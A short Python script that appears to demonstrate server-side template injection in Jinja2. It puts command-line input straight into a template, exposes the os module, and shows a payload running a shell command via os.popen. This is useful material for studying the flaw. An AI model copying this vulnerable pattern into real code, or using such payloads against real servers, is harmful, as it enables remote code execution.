# coding: utf-8
import os
import sys
from jinja2 import Template
 
template = Template("Your input: {}".format(sys.argv[1] if len(sys.argv) > 1 else '<empty>'))
template.globals['os'] = os
 
print template.render()

'''
$ python myjinja2.py "{{ os.popen('echo Hello RCE').read() }}"
Your input: Hello RCE
$ python myjinja2.py "{{ 'abcd'.upper() }}"
Your input: ABCD
'''
